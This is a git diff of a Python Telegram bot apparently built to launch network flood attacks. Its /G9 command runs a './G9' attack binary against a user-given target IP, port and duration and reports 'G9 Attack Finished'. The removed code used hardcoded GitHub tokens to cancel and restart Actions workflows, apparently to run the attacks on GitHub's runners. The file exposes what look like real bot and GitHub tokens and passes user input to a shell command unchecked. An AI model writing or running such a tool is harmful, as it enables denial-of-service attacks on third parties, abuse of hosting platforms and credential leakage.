@@ -1,78 +1,9 @@
+#!/usr/bin/python3
 import telebot
 import subprocess
-import requests
 
 # Insert your Telegram bot token here
 bot = telebot.TeleBot('6472534758:AAGTOvmuiBnQSpQdmM2oNX_g1YJZtxLH8bA')
-
-# GitHub data for workflows
-github_data = [
-    {
-        "token": "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",
-        "repo": "yespap589/SET_TP"
-    },
-    {
-        "token": "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",
-        "repo": "wadu696/yoga"
-    }
-]
-
-# Function to get the latest workflow run ID
-def get_latest_workflow_run(repo, token):
-    url = f"https://api.github.com/repos/{repo}/actions/runs"
-    headers = {
-        "Authorization": f"Bearer {token}",
-        "Accept": "application/vnd.github.v3+json"
-    }
-    
-    response = requests.get(url, headers=headers)
-    
-    if response.status_code == 200:
-        runs = response.json()['workflow_runs']
-        if runs:
-            # Return the ID of the latest run
-            return runs[0]['id']
-    else:
-        print(f"Failed to get workflow runs for {repo}: {response.status_code} {response.text}")
-    
-    return None
-
-# Function to stop the current workflow
-def stop_current_workflow(repo, token, workflow_run_id):
-    if not workflow_run_id:
-        print(f"No workflow run ID provided for {repo}.")
-        return
-
-    url = f"https://api.github.com/repos/{repo}/actions/runs/{workflow_run_id}/cancel"
-    headers = {
-        "Authorization": f"Bearer {token}",
-        "Accept": "application/vnd.github.v3+json"
-    }
-    
-    response = requests.post(url, headers=headers)
-    
-    if response.status_code == 204:
-        print(f"Successfully canceled the workflow for {repo}.")
-    else:
-        print(f"Failed to cancel the workflow for {repo}: {response.status_code} {response.text}")
-
-# Function to trigger a new workflow
-def trigger_workflow(repo, token):
-    url = f"https://api.github.com/repos/{repo}/actions/workflows/main.yml/dispatches"
-    headers = {
-        "Authorization": f"Bearer {token}",
-        "Accept": "application/vnd.github.v3+json"
-    }
-    data = {
-        "ref": "main"  # Adjust if your default branch is different
-    }
-    
-    response = requests.post(url, headers=headers, json=data)
-    
-    if response.status_code == 201:
-        print(f"Successfully triggered new workflow for {repo}.")
-    else:
-        print(f"Failed to trigger workflow for {repo}: {response.status_code} {response.text}")
 
 # Handler for /G9 command
 @bot.message_handler(commands=['G9'])
@@ -91,13 +22,6 @@ def handle_G9(message):
             full_command = f"./G9 {target} {port} {time} {power}"
             subprocess.run(full_command, shell=True)  # Run the command in the shell
             response = f"G9 Attack Finished. Target: {target} Port: {port} Time: {time} seconds."
-
-            # Stop the current workflow and start a new one
-            for data in github_data:
-                # Get the latest workflow run ID
-                workflow_run_id = get_latest_workflow_run(data['repo'], data['token'])
-                stop_current_workflow(data['repo'], data['token'], workflow_run_id)
-                trigger_workflow(data['repo'], data['token'])
     else:
         response = '''Usage: /G9 <target> <port> <time> <power>
 Example: /G9 192.168.1.1 80 60 300
